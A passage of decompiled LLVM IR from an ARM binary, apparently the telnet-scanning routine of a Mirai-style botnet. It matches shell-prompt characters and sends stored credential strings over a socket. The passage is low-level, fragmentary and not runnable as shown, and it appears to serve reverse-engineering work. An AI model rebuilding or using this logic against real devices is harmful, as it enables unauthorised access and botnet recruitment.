  br i1 %v7_11134, label %dec_label_pc_11184, label %dec_label_pc_1113c

dec_label_pc_1113c:                               ; preds = %dec_label_pc_11134
  %v2_1113c = icmp ugt i8 %v3_1111c, 36
  store i1 %v2_1113c, i1* %cpsr_c.global-to-local, align 1
  %v7_1113c = icmp eq i8 %v3_1111c, 37
  store i1 %v7_1113c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1113c, label %dec_label_pc_11184, label %dec_label_pc_1116c.preheader

dec_label_pc_1116c.preheader:                     ; preds = %dec_label_pc_1113c
  %v3_11140 = add i32 %v0_10d44, 28
  %v2_11144 = add i32 %v3_11140, %v3_11108
  store i32 %v2_11144, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1116c

dec_label_pc_11150:                               ; preds = %bb404
  %v2_11150 = icmp ugt i8 %v3_11174, 35
  store i1 %v2_11150, i1* %cpsr_c.global-to-local, align 1
  %v7_11150 = icmp eq i8 %v3_11174, 36
  store i1 %v7_11150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11150, label %dec_label_pc_11184, label %dec_label_pc_11158

dec_label_pc_11158:                               ; preds = %dec_label_pc_11150
  %v2_11158 = icmp ugt i8 %v3_11174, 34
  store i1 %v2_11158, i1* %cpsr_c.global-to-local, align 1
  %v7_11158 = icmp eq i8 %v3_11174, 35
  store i1 %v7_11158, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11158, label %dec_label_pc_11184, label %dec_label_pc_11160

dec_label_pc_11160:                               ; preds = %dec_label_pc_11158
  %v2_11160 = icmp ugt i8 %v3_11174, 36
  store i1 %v2_11160, i1* %cpsr_c.global-to-local, align 1
  %v7_11160 = icmp eq i8 %v3_11174, 37
  store i1 %v7_11160, i1* %cpsr_z.global-to-local, align 1
  %v1_11164 = add i32 %v0_11164, -1
  store i32 %v1_11164, i32* %r3.global-to-local, align 4
  br i1 %v7_11160, label %dec_label_pc_11184, label %dec_label_pc_1116c

dec_label_pc_1116c:                               ; preds = %dec_label_pc_1116c.preheader, %dec_label_pc_11160
  %v0_11164 = phi i32 [ %v2_11144, %dec_label_pc_1116c.preheader ], [ %v1_11164, %dec_label_pc_11160 ]
  %v0_1116c = phi i32 [ %v1_1110c, %dec_label_pc_1116c.preheader ], [ %v1_1116c, %dec_label_pc_11160 ]
  %v1_1116c = add i32 %v0_1116c, -1
  store i32 %v1_1116c, i32* %r1.global-to-local, align 4
  %v2_1116c = icmp ne i32 %v0_1116c, 0
  store i1 %v2_1116c, i1* %cpsr_c.global-to-local, align 1
  %v7_1116c = icmp eq i32 %v0_1116c, 1
  store i1 %v7_1116c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1116c, label %dec_label_pc_10cc8.backedge.thread528, label %dec_label_pc_11174

dec_label_pc_11174:                               ; preds = %dec_label_pc_1116c
  %v1_11174 = add i32 %v0_11164, -2
  %v2_11174 = inttoptr i32 %v1_11174 to i8*
  %v3_11174 = load i8, i8* %v2_11174, align 1
  %v4_11174 = zext i8 %v3_11174 to i32
  store i32 %v4_11174, i32* %r2.global-to-local, align 4
  %v2_11178 = icmp ugt i8 %v3_11174, 61
  store i1 %v2_11178, i1* %cpsr_c.global-to-local, align 1
  %v7_11178 = icmp eq i8 %v3_11174, 62
  store i1 %v7_11178, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11178, label %dec_label_pc_11184, label %bb404

bb404:                                            ; preds = %dec_label_pc_11174
  %v3_1117c = icmp ugt i8 %v3_11174, 57
  store i1 %v3_1117c, i1* %cpsr_c.global-to-local, align 1
  %v8_1117c = icmp eq i8 %v3_11174, 58
  store i1 %v8_1117c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1117c, label %dec_label_pc_11184, label %dec_label_pc_11150

dec_label_pc_11184:                               ; preds = %dec_label_pc_11174, %bb404, %dec_label_pc_11160, %dec_label_pc_11158, %dec_label_pc_11150, %dec_label_pc_1113c, %dec_label_pc_11118, %dec_label_pc_11134, %dec_label_pc_1112c, %bb403
  %v0_11188 = phi i32 [ %v1_1110c, %dec_label_pc_1113c ], [ %v1_1110c, %dec_label_pc_11118 ], [ %v1_1110c, %dec_label_pc_11134 ], [ %v1_1110c, %dec_label_pc_1112c ], [ %v1_1110c, %bb403 ], [ %v1_1116c, %dec_label_pc_11150 ], [ %v1_1116c, %dec_label_pc_11158 ], [ %v1_1116c, %dec_label_pc_11160 ], [ %v1_1116c, %bb404 ], [ %v1_1116c, %dec_label_pc_11174 ]
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_11188 = add i32 %v0_11188, 1
  store i32 %v1_11188, i32* @r7, align 4
  %v1_1118c = call i32 @table_unlock_val(i32 27)
  store i32 %v2_11340, i32* %r1.global-to-local, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v3_1119c = call i32 @table_retrieve_val(i32 27, i32* nonnull %stack_var_-60)
  store i32 %v3_1119c, i32* %r0.global-to-local, align 4
  %v3_111a0 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_111a0, i32* %r2.global-to-local, align 4
  store i32 %v3_1119c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_111ac = load i32, i32* @r5, align 4
  %v1_111ac = add i32 %v0_111ac, 4
  %v2_111ac = inttoptr i32 %v1_111ac to i32*
  %v3_111ac = load i32, i32* %v2_111ac, align 4
  store i32 %v3_111ac, i32* %r0.global-to-local, align 4
  %v4_111b0 = call i32 @__libc_send(i32 %v3_111ac, i32 %v3_1119c, i32 %v3_111a0, i32 16384)
  store i32 %v4_111b0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_111c0 = load i32, i32* @r5, align 4
  %v1_111c0 = add i32 %v0_111c0, 4
  %v2_111c0 = inttoptr i32 %v1_111c0 to i32*
  %v3_111c0 = load i32, i32* %v2_111c0, align 4
  store i32 %v3_111c0, i32* %r0.global-to-local, align 4
  %v4_111c4 = call i32 @__libc_send(i32 %v3_111c0, i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32 2, i32 16384)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_111cc = call i32 @table_lock_val(i32 27)
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_111d4 = load i32, i32* @r5, align 4
  %v2_111d4 = add i32 %v1_111d4, 12
  %v3_111d4 = inttoptr i32 %v2_111d4 to i32*
  store i32 9, i32* %v3_111d4, align 4
  br label %dec_label_pc_10e64

dec_label_pc_111dc:                               ; preds = %dec_label_pc_10d44
  %v1_111dc = add i32 %v0_10d44, 24
  %v2_111dc = inttoptr i32 %v1_111dc to i32*
  %v3_111dc = load i32, i32* %v2_111dc, align 4
  store i32 %v3_111dc, i32* %r2.global-to-local, align 4
  %v1_111e0 = add i32 %v3_111dc, -1
  store i32 %v1_111e0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_111e4 = icmp eq i32 %v1_111e0, 0
  store i1 %v2_111e4, i1* %cpsr_z.global-to-local, align 1
  %tmp405 = icmp slt i32 %v1_111e0, 1
  br i1 %tmp405, label %dec_label_pc_10cc8.backedge.thread, label %dec_label_pc_111ec

dec_label_pc_111ec:                               ; preds = %dec_label_pc_111dc
  %v2_111ec = add i32 %v1_111e0, %v0_10d44
  store i32 %v2_111ec, i32* %r3.global-to-local, align 4
  %v1_111f0 = add i32 %v2_111ec, 28
  %v2_111f0 = inttoptr i32 %v1_111f0 to i8*
  %v3_111f0 = load i8, i8* %v2_111f0, align 1
  %v4_111f0 = zext i8 %v3_111f0 to i32
  store i32 %v4_111f0, i32* %r3.global-to-local, align 4
  %v2_111f4 = icmp ugt i8 %v3_111f0, 61
  store i1 %v2_111f4, i1* %cpsr_c.global-to-local, align 1
  %v7_111f4 = icmp eq i8 %v3_111f0, 62
  store i1 %v7_111f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_111f4, label %dec_label_pc_11258, label %bb406

bb406:                                            ; preds = %dec_label_pc_111ec
  %v3_111f8 = icmp ugt i8 %v3_111f0, 57
  store i1 %v3_111f8, i1* %cpsr_c.global-to-local, align 1
  %v8_111f8 = icmp eq i8 %v3_111f0, 58
  store i1 %v8_111f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_111f8, label %dec_label_pc_11258, label %dec_label_pc_11200

dec_label_pc_11200:                               ; preds = %bb406
  %v2_11200 = icmp ugt i8 %v3_111f0, 35
  store i1 %v2_11200, i1* %cpsr_c.global-to-local, align 1
  %v7_11200 = icmp eq i8 %v3_111f0, 36
  store i1 %v7_11200, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11200, label %dec_label_pc_11258, label %dec_label_pc_11208

dec_label_pc_11208:                               ; preds = %dec_label_pc_11200
  %v2_11208 = icmp ugt i8 %v3_111f0, 34
  store i1 %v2_11208, i1* %cpsr_c.global-to-local, align 1
  %v7_11208 = icmp eq i8 %v3_111f0, 35
  store i1 %v7_11208, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11208, label %dec_label_pc_11258, label %dec_label_pc_11210

dec_label_pc_11210:                               ; preds = %dec_label_pc_11208
  %v2_11210 = icmp ugt i8 %v3_111f0, 36
  store i1 %v2_11210, i1* %cpsr_c.global-to-local, align 1
  %v7_11210 = icmp eq i8 %v3_111f0, 37
  store i1 %v7_11210, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11210, label %dec_label_pc_11258, label %dec_label_pc_11240.preheader

dec_label_pc_11240.preheader:                     ; preds = %dec_label_pc_11210
  %v3_11214 = add i32 %v0_10d44, 28
  %v2_11218 = add i32 %v3_11214, %v3_111dc
  store i32 %v2_11218, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11240

dec_label_pc_11224:                               ; preds = %bb407
  %v2_11224 = icmp ugt i8 %v3_11248, 35
  store i1 %v2_11224, i1* %cpsr_c.global-to-local, align 1
  %v7_11224 = icmp eq i8 %v3_11248, 36
  store i1 %v7_11224, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11224, label %dec_label_pc_11258, label %dec_label_pc_1122c

dec_label_pc_1122c:                               ; preds = %dec_label_pc_11224
  %v2_1122c = icmp ugt i8 %v3_11248, 34
  store i1 %v2_1122c, i1* %cpsr_c.global-to-local, align 1
  %v7_1122c = icmp eq i8 %v3_11248, 35
  store i1 %v7_1122c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1122c, label %dec_label_pc_11258, label %dec_label_pc_11234

dec_label_pc_11234:                               ; preds = %dec_label_pc_1122c
  %v2_11234 = icmp ugt i8 %v3_11248, 36
  store i1 %v2_11234, i1* %cpsr_c.global-to-local, align 1
  %v7_11234 = icmp eq i8 %v3_11248, 37
  store i1 %v7_11234, i1* %cpsr_z.global-to-local, align 1
  %v1_11238 = add i32 %v0_11238, -1
  store i32 %v1_11238, i32* %r3.global-to-local, align 4
  br i1 %v7_11234, label %dec_label_pc_11258, label %dec_label_pc_11240

dec_label_pc_11240:                               ; preds = %dec_label_pc_11240.preheader, %dec_label_pc_11234
  %v0_11238 = phi i32 [ %v2_11218, %dec_label_pc_11240.preheader ], [ %v1_11238, %dec_label_pc_11234 ]
  %v0_11240 = phi i32 [ %v1_111e0, %dec_label_pc_11240.preheader ], [ %v1_11240, %dec_label_pc_11234 ]
  %v1_11240 = add i32 %v0_11240, -1
  store i32 %v1_11240, i32* %r1.global-to-local, align 4
  %v2_11240 = icmp ne i32 %v0_11240, 0
  store i1 %v2_11240, i1* %cpsr_c.global-to-local, align 1
  %v7_11240 = icmp eq i32 %v0_11240, 1
  store i1 %v7_11240, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11240, label %dec_label_pc_10cc8.backedge.thread528, label %dec_label_pc_11248

dec_label_pc_11248:                               ; preds = %dec_label_pc_11240
  %v1_11248 = add i32 %v0_11238, -2
  %v2_11248 = inttoptr i32 %v1_11248 to i8*
  %v3_11248 = load i8, i8* %v2_11248, align 1
  %v4_11248 = zext i8 %v3_11248 to i32
  store i32 %v4_11248, i32* %r2.global-to-local, align 4
  %v2_1124c = icmp ugt i8 %v3_11248, 61
  store i1 %v2_1124c, i1* %cpsr_c.global-to-local, align 1
  %v7_1124c = icmp eq i8 %v3_11248, 62
  store i1 %v7_1124c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1124c, label %dec_label_pc_11258, label %bb407

bb407:                                            ; preds = %dec_label_pc_11248
  %v3_11250 = icmp ugt i8 %v3_11248, 57
  store i1 %v3_11250, i1* %cpsr_c.global-to-local, align 1
  %v8_11250 = icmp eq i8 %v3_11248, 58
  store i1 %v8_11250, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11250, label %dec_label_pc_11258, label %dec_label_pc_11224

dec_label_pc_11258:                               ; preds = %dec_label_pc_11248, %bb407, %dec_label_pc_11234, %dec_label_pc_1122c, %dec_label_pc_11224, %dec_label_pc_11210, %dec_label_pc_111ec, %dec_label_pc_11208, %dec_label_pc_11200, %bb406
  %v0_1125c = phi i32 [ %v1_111e0, %dec_label_pc_11210 ], [ %v1_111e0, %dec_label_pc_111ec ], [ %v1_111e0, %dec_label_pc_11208 ], [ %v1_111e0, %dec_label_pc_11200 ], [ %v1_111e0, %bb406 ], [ %v1_11240, %dec_label_pc_11224 ], [ %v1_11240, %dec_label_pc_1122c ], [ %v1_11240, %dec_label_pc_11234 ], [ %v1_11240, %bb407 ], [ %v1_11240, %dec_label_pc_11248 ]
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_1125c = add i32 %v0_1125c, 1
  store i32 %v1_1125c, i32* @r7, align 4
  %v1_11260 = call i32 @table_unlock_val(i32 25)
  store i32 %v2_11340, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_11270 = call i32 @table_retrieve_val(i32 25, i32* nonnull %stack_var_-60)
  store i32 %v3_11270, i32* %r0.global-to-local, align 4
  %v3_11274 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_11274, i32* %r2.global-to-local, align 4
  store i32 %v3_11270, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11280 = load i32, i32* @r5, align 4
  %v1_11280 = add i32 %v0_11280, 4
  %v2_11280 = inttoptr i32 %v1_11280 to i32*
  %v3_11280 = load i32, i32* %v2_11280, align 4
  store i32 %v3_11280, i32* %r0.global-to-local, align 4
  %v4_11284 = call i32 @__libc_send(i32 %v3_11280, i32 %v3_11270, i32 %v3_11274, i32 16384)
  store i32 %v4_11284, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11294 = load i32, i32* @r5, align 4
  %v1_11294 = add i32 %v0_11294, 4
  %v2_11294 = inttoptr i32 %v1_11294 to i32*
  %v3_11294 = load i32, i32* %v2_11294, align 4
  store i32 %v3_11294, i32* %r0.global-to-local, align 4
  %v4_11298 = call i32 @__libc_send(i32 %v3_11294, i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32 2, i32 16384)
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_112a0 = call i32 @table_lock_val(i32 25)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_112a8 = load i32, i32* @r5, align 4
  %v2_112a8 = add i32 %v1_112a8, 12
  %v3_112a8 = inttoptr i32 %v2_112a8 to i32*
  store i32 6, i32* %v3_112a8, align 4
  br label %dec_label_pc_10e64

dec_label_pc_112b0:                               ; preds = %dec_label_pc_10d44
  %v1_112b0 = add i32 %v0_10d44, 24
  %v2_112b0 = inttoptr i32 %v1_112b0 to i32*
  %v3_112b0 = load i32, i32* %v2_112b0, align 4
  store i32 %v3_112b0, i32* %r2.global-to-local, align 4
  %v1_112b4 = add i32 %v3_112b0, -1
  store i32 %v1_112b4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_112b8 = icmp eq i32 %v1_112b4, 0
  store i1 %v2_112b8, i1* %cpsr_z.global-to-local, align 1
  %tmp408 = icmp slt i32 %v1_112b4, 1
  br i1 %tmp408, label %dec_label_pc_1132c, label %dec_label_pc_112c0

dec_label_pc_112c0:                               ; preds = %dec_label_pc_112b0
  %v2_112c0 = add i32 %v1_112b4, %v0_10d44
  store i32 %v2_112c0, i32* %r3.global-to-local, align 4
  %v1_112c4 = add i32 %v2_112c0, 28
  %v2_112c4 = inttoptr i32 %v1_112c4 to i8*
  %v3_112c4 = load i8, i8* %v2_112c4, align 1
  %v4_112c4 = zext i8 %v3_112c4 to i32
  store i32 %v4_112c4, i32* %r3.global-to-local, align 4
  %v2_112c8 = icmp ugt i8 %v3_112c4, 61
  store i1 %v2_112c8, i1* %cpsr_c.global-to-local, align 1
  %v7_112c8 = icmp eq i8 %v3_112c4, 62
  store i1 %v7_112c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112c8, label %dec_label_pc_115e4, label %bb409

bb409:                                            ; preds = %dec_label_pc_112c0
  %v3_112cc = icmp ugt i8 %v3_112c4, 57
  store i1 %v3_112cc, i1* %cpsr_c.global-to-local, align 1
  %v8_112cc = icmp eq i8 %v3_112c4, 58
  store i1 %v8_112cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_112cc, label %dec_label_pc_115e4, label %dec_label_pc_112d4

dec_label_pc_112d4:                               ; preds = %bb409
  %v2_112d4 = icmp ugt i8 %v3_112c4, 35
  store i1 %v2_112d4, i1* %cpsr_c.global-to-local, align 1
  %v7_112d4 = icmp eq i8 %v3_112c4, 36
  store i1 %v7_112d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112d4, label %dec_label_pc_115e4, label %dec_label_pc_112dc

dec_label_pc_112dc:                               ; preds = %dec_label_pc_112d4
  %v2_112dc = icmp ugt i8 %v3_112c4, 34
  store i1 %v2_112dc, i1* %cpsr_c.global-to-local, align 1
  %v7_112dc = icmp eq i8 %v3_112c4, 35
  store i1 %v7_112dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112dc, label %dec_label_pc_115e4, label %dec_label_pc_112e4

dec_label_pc_112e4:                               ; preds = %dec_label_pc_112dc
  %v2_112e4 = icmp ugt i8 %v3_112c4, 36
  store i1 %v2_112e4, i1* %cpsr_c.global-to-local, align 1
  %v7_112e4 = icmp eq i8 %v3_112c4, 37
  store i1 %v7_112e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112e4, label %dec_label_pc_115e4, label %dec_label_pc_11324.preheader

dec_label_pc_11324.preheader:                     ; preds = %dec_label_pc_112e4
  %v3_112e8 = add i32 %v0_10d44, 28
  %v2_112ec = add i32 %v3_112e8, %v3_112b0
  store i32 %v2_112ec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11324

dec_label_pc_112f8:                               ; preds = %dec_label_pc_11324
  %v1_112f8 = add i32 %v0_1131c, -2
  %v2_112f8 = inttoptr i32 %v1_112f8 to i8*
  %v3_112f8 = load i8, i8* %v2_112f8, align 1
  %v4_112f8 = zext i8 %v3_112f8 to i32
  store i32 %v4_112f8, i32* %r2.global-to-local, align 4
  %v2_112fc = icmp ugt i8 %v3_112f8, 61
  store i1 %v2_112fc, i1* %cpsr_c.global-to-local, align 1
  %v7_112fc = icmp eq i8 %v3_112f8, 62
  store i1 %v7_112fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112fc, label %dec_label_pc_115e4, label %bb410

bb410:                                            ; preds = %dec_label_pc_112f8
  %v3_11300 = icmp ugt i8 %v3_112f8, 57
  store i1 %v3_11300, i1* %cpsr_c.global-to-local, align 1
  %v8_11300 = icmp eq i8 %v3_112f8, 58
  store i1 %v8_11300, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11300, label %dec_label_pc_115e4, label %dec_label_pc_11308

dec_label_pc_11308:                               ; preds = %bb410
  %v2_11308 = icmp ugt i8 %v3_112f8, 35
  store i1 %v2_11308, i1* %cpsr_c.global-to-local, align 1
  %v7_11308 = icmp eq i8 %v3_112f8, 36
  store i1 %v7_11308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11308, label %dec_label_pc_115e4, label %dec_label_pc_11310

dec_label_pc_11310:                               ; preds = %dec_label_pc_11308
  %v2_11310 = icmp ugt i8 %v3_112f8, 34
  store i1 %v2_11310, i1* %cpsr_c.global-to-local, align 1
  %v7_11310 = icmp eq i8 %v3_112f8, 35
  store i1 %v7_11310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11310, label %dec_label_pc_115e4, label %dec_label_pc_11318

dec_label_pc_11318:                               ; preds = %dec_label_pc_11310
  %v2_11318 = icmp ugt i8 %v3_112f8, 36
  store i1 %v2_11318, i1* %cpsr_c.global-to-local, align 1
  %v7_11318 = icmp eq i8 %v3_112f8, 37
  store i1 %v7_11318, i1* %cpsr_z.global-to-local, align 1
  %v1_1131c = add i32 %v0_1131c, -1
  store i32 %v1_1131c, i32* %r3.global-to-local, align 4
  br i1 %v7_11318, label %dec_label_pc_115e4, label %dec_label_pc_11324

dec_label_pc_11324:                               ; preds = %dec_label_pc_11324.preheader, %dec_label_pc_11318
  %v0_1131c = phi i32 [ %v2_112ec, %dec_label_pc_11324.preheader ], [ %v1_1131c, %dec_label_pc_11318 ]
  %v0_11324 = phi i32 [ %v1_112b4, %dec_label_pc_11324.preheader ], [ %v1_11324, %dec_label_pc_11318 ]
  %v1_11324 = add i32 %v0_11324, -1
  store i32 %v1_11324, i32* %r0.global-to-local, align 4
  %v2_11324 = icmp ne i32 %v0_11324, 0
  store i1 %v2_11324, i1* %cpsr_c.global-to-local, align 1
  %v7_11324 = icmp eq i32 %v0_11324, 1
  store i1 %v7_11324, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11324, label %dec_label_pc_1132c, label %dec_label_pc_112f8

dec_label_pc_1132c:                               ; preds = %dec_label_pc_11324, %dec_label_pc_112b0
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_11330 = call i32 @table_unlock_val(i32 32)
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_11338 = call i32 @table_unlock_val(i32 33)
  store i32 %v2_11340, i32* %r1.global-to-local, align 4
  store i32 32, i32* %r0.global-to-local, align 4
  %v3_11348 = call i32 @table_retrieve_val(i32 32, i32* nonnull %stack_var_-60)
  store i32 %v3_11348, i32* @r4, align 4
  store i32 %v2_11354, i32* %r1.global-to-local, align 4
  store i32 33, i32* %r0.global-to-local, align 4
  %v3_1135c = call i32 @table_retrieve_val(i32 33, i32* %v2_1135c)
  %v3_11360 = load i32, i32* %stack_var_-60, align 4
  %sext = mul i32 %v3_1135c, 16777216
  %v1_11364 = sdiv i32 %sext, 16777216
  store i32 %v1_11364, i32* @r6, align 4
  %v0_11368 = load i32, i32* @r4, align 4
  store i32 %v0_11368, i32* %r2.global-to-local, align 4
  %v1_1136c = add i32 %v3_11360, -1
  store i32 %v1_1136c, i32* %r3.global-to-local, align 4
  %v0_11370 = load i32, i32* @sl, align 4
  store i32 %v0_11370, i32* %r0.global-to-local, align 4
  %v0_11374 = load i32, i32* @r5, align 4
  %v1_11374 = add i32 %v0_11374, 24
  %v2_11374 = inttoptr i32 %v1_11374 to i32*
  %v3_11374 = load i32, i32* %v2_11374, align 4
  store i32 %v3_11374, i32* %r1.global-to-local, align 4
  %v4_11378 = call i32 @util_memsearch(i32 %v0_11370, i32 %v3_11374, i32 %v0_11368, i32 %v1_1136c)
  store i32 %v4_11378, i32* %r0.global-to-local, align 4
  %v2_1137c = icmp eq i32 %v4_11378, -1
  store i1 %v2_1137c, i1* %cpsr_c.global-to-local, align 1
  %v7_1137c = icmp eq i32 %v4_11378, -1
  store i1 %v7_1137c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1137c, label %dec_label_pc_11720, label %dec_label_pc_1138c

dec_label_pc_1138c:                               ; preds = %dec_label_pc_11720, %dec_label_pc_1132c
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_11390 = call i32 @table_lock_val(i32 32)
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_11398 = call i32 @table_lock_val(i32 33)
  store i32 %v1_11398, i32* %r0.global-to-local, align 4
  %v0_1139c = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1139c = icmp eq i32 %v0_1139c, 0
  store i1 %v2_1139c, i1* %cpsr_z.global-to-local, align 1
  %tmp411 = icmp slt i32 %v0_1139c, 1
  br i1 %tmp411, label %dec_label_pc_11490, label %dec_label_pc_1138c.dec_label_pc_115e8_crit_edge

dec_label_pc_1138c.dec_label_pc_115e8_crit_edge:  ; preds = %dec_label_pc_1138c
  %v0_115e8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_115e8

dec_label_pc_113a8:                               ; preds = %dec_label_pc_10d44
  %v1_113a8 = add i32 %v0_10d44, 24
  %v2_113a8 = inttoptr i32 %v1_113a8 to i32*
  %v3_113a8 = load i32, i32* %v2_113a8, align 4
  store i32 %v3_113a8, i32* %r2.global-to-local, align 4
  %v1_113ac = add i32 %v3_113a8, -1
  store i32 %v1_113ac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_113b0 = icmp eq i32 %v1_113ac, 0
  store i1 %v2_113b0, i1* %cpsr_z.global-to-local, align 1
  %tmp412 = icmp slt i32 %v1_113ac, 1
  br i1 %tmp412, label %dec_label_pc_11414, label %dec_label_pc_113b8

dec_label_pc_113b8:                               ; preds = %dec_label_pc_113a8
  %v2_113b8 = add i32 %v1_113ac, %v0_10d44
  store i32 %v2_113b8, i32* %r3.global-to-local, align 4
  %v1_113bc = add i32 %v2_113b8, 28
  %v2_113bc = inttoptr i32 %v1_113bc to i8*
  %v3_113bc = load i8, i8* %v2_113bc, align 1
  %v4_113bc = zext i8 %v3_113bc to i32
  store i32 %v4_113bc, i32* %r3.global-to-local, align 4
  %v2_113c0 = icmp ugt i8 %v3_113bc, 61
  store i1 %v2_113c0, i1* %cpsr_c.global-to-local, align 1
  %v7_113c0 = icmp eq i8 %v3_113bc, 62
  store i1 %v7_113c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113c0, label %dec_label_pc_115dc, label %bb413

bb413:                                            ; preds = %dec_label_pc_113b8
  %v3_113c4 = icmp ugt i8 %v3_113bc, 57
  store i1 %v3_113c4, i1* %cpsr_c.global-to-local, align 1
  %v8_113c4 = icmp eq i8 %v3_113bc, 58
  store i1 %v8_113c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_113c4, label %dec_label_pc_115dc, label %dec_label_pc_113cc

dec_label_pc_113cc:                               ; preds = %bb413
  %v2_113cc = icmp ugt i8 %v3_113bc, 35
  store i1 %v2_113cc, i1* %cpsr_c.global-to-local, align 1
  %v7_113cc = icmp eq i8 %v3_113bc, 36
  store i1 %v7_113cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113cc, label %dec_label_pc_115dc, label %dec_label_pc_113d4

dec_label_pc_113d4:                               ; preds = %dec_label_pc_113cc
  %v2_113d4 = icmp ugt i8 %v3_113bc, 34
  store i1 %v2_113d4, i1* %cpsr_c.global-to-local, align 1
  %v7_113d4 = icmp eq i8 %v3_113bc, 35
  store i1 %v7_113d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113d4, label %dec_label_pc_115dc, label %dec_label_pc_1140c.preheader

dec_label_pc_1140c.preheader:                     ; preds = %dec_label_pc_113d4
  %v3_113d8 = add i32 %v0_10d44, 28
  %v2_113dc = add i32 %v3_113d8, %v3_113a8
  store i32 %v2_113dc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1140c

dec_label_pc_113e8:                               ; preds = %dec_label_pc_1140c
  %v1_113e8 = add i32 %v0_11404, -2
  %v2_113e8 = inttoptr i32 %v1_113e8 to i8*
  %v3_113e8 = load i8, i8* %v2_113e8, align 1
  %v4_113e8 = zext i8 %v3_113e8 to i32
  store i32 %v4_113e8, i32* %r2.global-to-local, align 4
  %v2_113ec = icmp ugt i8 %v3_113e8, 61
  store i1 %v2_113ec, i1* %cpsr_c.global-to-local, align 1
  %v7_113ec = icmp eq i8 %v3_113e8, 62
  store i1 %v7_113ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113ec, label %dec_label_pc_115dc, label %bb414

bb414:                                            ; preds = %dec_label_pc_113e8
  %v3_113f0 = icmp ugt i8 %v3_113e8, 57
  store i1 %v3_113f0, i1* %cpsr_c.global-to-local, align 1
  %v8_113f0 = icmp eq i8 %v3_113e8, 58
  store i1 %v8_113f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_113f0, label %dec_label_pc_115dc, label %dec_label_pc_113f8

dec_label_pc_113f8:                               ; preds = %bb414
  %v2_113f8 = icmp ugt i8 %v3_113e8, 35
  store i1 %v2_113f8, i1* %cpsr_c.global-to-local, align 1
  %v7_113f8 = icmp eq i8 %v3_113e8, 36
  store i1 %v7_113f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113f8, label %dec_label_pc_115dc, label %dec_label_pc_11400

dec_label_pc_11400:                               ; preds = %dec_label_pc_113f8
  %v2_11400 = icmp ugt i8 %v3_113e8, 34
  store i1 %v2_11400, i1* %cpsr_c.global-to-local, align 1
  %v7_11400 = icmp eq i8 %v3_113e8, 35
